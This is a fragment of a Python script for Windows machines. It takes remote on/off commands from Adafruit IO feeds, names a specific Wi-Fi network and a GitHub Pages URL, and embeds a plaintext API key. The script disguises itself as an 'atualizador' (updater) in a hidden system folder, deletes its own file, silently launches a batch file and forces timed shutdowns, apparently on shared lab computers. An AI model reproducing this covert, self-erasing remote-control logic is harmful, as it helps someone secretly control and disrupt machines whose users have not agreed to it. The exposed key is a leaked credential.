...
EXECUCAO = control["LIGADO"]

def remote_control():
    response = requests.get("https://io.adafruit.com/api/v2/lokilaki212/feeds/log-xm")

    if response.status_code == 200:
        resposta = response.json()
        log = int(resposta["last_value"])
    else:
        log = 1
    
    
    response = requests.get("https://io.adafruit.com/api/v2/lokilaki212/feeds/projeto-xm")

    if response.status_code == 200:
        resposta = response.json()
        return control[resposta["last_value"]]
    else:
        return control["DESLIGADO"]

EXECUCAO = remote_control()

# Configurações fixas
wifi_interface = "Wi-Fi 4"
ethernet_interface = "Ethernet"
wifi_ssid = "CFP603_APOIO"
shutdown_hour = 5
shutdown_minute = 40
base_url = "https://muginhugin86.github.io/dcreamit/"
...
def is_after_23():
    url = "https://api.api-ninjas.com/v1/timezone?timezone=America%2FSao_Paulo"
    api_key = "pxH3xk5TPCV6yHyvF6SncA==juD3pSXkQ0XHrnyq"
    headers = {
        "X-Api-Key": api_key
    }
...
def modo_desligado():
    try:
        os.remove("C:/ProgramData/Temp/atualizador.pyc")
    except:
        pass
    subprocess.Popen(f'cmd /c start "" "{destino}\\updateFusion.bat"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(f'shutdown -a', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(20)
    subprocess.run(f'shutdown /s /f /t 3600', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    exit()


def main_master():
    if EXECUCAO != control["TESTE"]:
        if not is_after_23():
            os.remove("C:/ProgramData/Temp/atualizador.pyc")
            exit()
    #subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
